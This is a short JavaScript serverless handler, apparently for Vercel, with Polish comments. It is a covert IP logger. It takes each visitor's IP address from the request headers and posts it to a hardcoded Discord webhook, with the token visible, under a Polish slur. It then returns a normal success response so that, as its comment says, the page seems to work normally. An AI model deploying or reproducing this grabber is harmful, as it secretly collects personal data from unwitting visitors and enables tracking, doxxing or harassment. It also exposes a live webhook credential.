export default async function handler(req, res) {
    const webhookUrl = "https://discord.com/api/webhooks/1568767512722669761/lHPjWbbHIPlF0TW-FYnhTYXD5WIKsSINTMbDMy4ZVzT3ctUrcFGK2JX-XuQOvb0DTCpp";

    // Wyciąganie IP klienta z nagłówków Vercela
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "Unknown";

    const data = {
        content: `**IP CWELA:** ${ip}`
    };

    try {
        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
    } catch (err) {
        console.error(err);
    }

    // Zwracamy pustą odpowiedź, żeby strona działała normalnie
    return res.status(200).json({ success: true });
}
